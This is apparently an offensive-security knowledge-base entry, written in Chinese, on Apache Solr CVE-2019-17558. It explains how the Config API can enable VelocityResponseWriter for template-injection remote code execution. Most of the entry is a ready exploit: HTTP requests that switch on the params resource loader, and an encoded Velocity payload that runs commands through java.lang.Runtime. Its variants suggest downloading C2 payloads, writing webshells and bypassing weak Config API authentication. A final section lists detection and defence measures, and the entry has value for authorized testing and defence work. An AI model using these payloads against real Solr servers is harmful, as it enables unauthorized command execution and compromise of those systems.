---
id: web-java-component-solr-velocityresponsewriter-config-rce
title: Apache Solr Config API 启用 VelocityResponseWriter：wt=velocity 模板注入执行命令
type: scenario
domain: web
path: web/java/component
technique: solr-velocityresponsewriter-config-rce
aliases:
- Solr Velocity RCE
- VelocityResponseWriter
- v.template.custom
- wt=velocity
- Solr Config API RCE
- CVE-2019-17558
tags:
- solr
- java
- velocity
- ssti
- config-api
- rce
- cve-2019-17558
cve:
- CVE-2019-17558
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V254
  verified_at: '2026-11-07T16:03:22+08:00'
  notes: 已对照原文与16张图片逐项核对：Config API JSON、wt=velocity、v.template.custom Velocity代码、whoami回显（win-ppdpadg72cc\administrator）与文章一致；PoC未实际复测，CVE-2019-17558官方区间以advisory为准
---

## 一句话结论

若 Apache Solr 的 Config API 可访问，攻击者可提交 `update-queryresponsewriter` 把 `wt=velocity` 的 `solr.VelocityResponseWriter` 配置为启用 `params.resource.loader.enabled=true`，随后请求 `select?wt=velocity&v.template=custom&v.template.custom=<Velocity 代码>`，用 `Class.forName("java.lang.Runtime").getRuntime().exec(...)` 在 Solr 进程执行命令。该利用方式与 CVE-2019-17558 一致，文章环境为 Solr 8.2.0。

## 原理

- **Config API 可改 queryResponseWriter**：Solr 的 `/solr/<core>/config` 接受 JSON，`update-queryresponsewriter` 可以新增/覆盖响应写入器；文章把 `velocity` 写入器指向 `solr.VelocityResponseWriter`，并设置 `params.resource.loader.enabled=true`、`solr.resource.loader.enabled=true`。
- **VelocityResponseWriter 的模板来源**：启用 params resource loader 后，`v.template.custom` 参数会被当作 Velocity 模板内容直接渲染；模板中可调用 Java 类（`$x.class.forName(...)`），因此能拿到 `java.lang.Runtime`。
- **命令执行与回显**：`$rt.getRuntime().exec('whoami')` 启动进程，`$ex.waitFor()` 等待，`$out.getInputStream()` 读取输出，`$out.available()` 与 `Character.toChars`/`String.valueOf` 把字节转成字符串拼进响应；也可换成 PowerShell 下载/执行 C2 载荷。
- **为什么成立**：Config API 与 Velocity 模板都是 Solr 的合法功能，但组合后把“可配置的模板来源”变成了任意代码执行；`params.resource.loader.enabled` 是安全开关，开启后用户可控模板不再受 classpath 限制。
- **版本/认证**：文章目标为 Solr 8.2.0，请求带 `SolrAuth: test`；Config API 是否需要认证、认证值为何取决于目标部署。CVE-2019-17558 的官方影响范围与修复版本以 advisory 为准。

## 触发条件

- Solr 的 Config API（`/solr/<core>/config`）可访问，且当前身份有修改配置的权限（或可绕过认证）。
- 目标版本包含 `solr.VelocityResponseWriter`，且未在 `solrconfig.xml` 中禁用/移除 Velocity 响应写入器。
- 能通过 Config API 设置 `params.resource.loader.enabled=true`（或目标原本已开启）。
- Solr 进程有权限执行目标命令。

## 利用步骤

1. 获取 core 名称（如 `cslab`），确认 `/solr/<core>/config` 可访问。
2. 提交配置 JSON，把 `update-queryresponsewriter` 的 `velocity` 设为 `solr.VelocityResponseWriter`，并开启 `params.resource.loader.enabled` 与 `solr.resource.loader.enabled`。
3. 构造 Velocity payload：用 `Class.forName('java.lang.Runtime')` 执行命令，`waitFor` 后读取 `InputStream` 输出；URL 编码后放入 `v.template.custom`。
4. 请求 `GET /solr/<core>/select?q=1&&wt=velocity&v.template=custom&v.template.custom=<payload>`，从响应读取命令输出。
5. 将命令替换为下载/执行 C2、读取 flag、写入 WebShell 等后续操作；授权测试用 `whoami`/`id` 等无害命令。

## PoC

配置请求：

```http
POST /solr/cslab/config HTTP/1.1
Host: target
SolrAuth: test
Content-Type: application/json

{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
```

执行 `whoami`（URL 编码后的 Velocity）：

```http
GET /solr/cslab/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
Host: target
```

## 变体与关联

- 变体：用 `ProcessBuilder` 代替 `Runtime.exec`；用 `$x.class.forName('java.lang.Runtime').getRuntime().exec(new String[]{...})` 传参数数组；用 PowerShell/curl 下载 C2。
- 变体：若 Config API 被保护，可结合 Solr 认证绕过/弱 `SolrAuth`、SSRF 到本机 Config API，或利用已有 `params.resource.loader.enabled=true` 直接打模板注入。
- 关联：[[web-java-component-solr-dumprequesthandler-file-read]]（同一目标的任意文件读取，可先读配置/认证信息）、[[web-java-component-solr-cve-2017-12629-xxe-runexecutablelistener-rce]]（另一种 Solr 配置/监听器 RCE）。
- 边界：Config API 不可达/无权限、目标移除 VelocityResponseWriter、`params.resource.loader.enabled` 被锁定为 false、模板被严格白名单时，该链不成立。

## 检测与防御

- 检测：`/solr/<core>/config` 出现 `update-queryresponsewriter`/`VelocityResponseWriter`/`params.resource.loader.enabled` 修改；`select` 请求带 `wt=velocity`、`v.template.custom`；响应中出现命令输出或异常模板代码；Solr 日志中的 Velocity 渲染错误。
- 防御：生产环境禁用 Config API 或严格限制可修改项；移除 VelocityResponseWriter；保持 `params.resource.loader.enabled=false`；升级 Solr 修复 CVE-2019-17558；启用强认证与最小权限；监控 `solrconfig.xml` 变更。
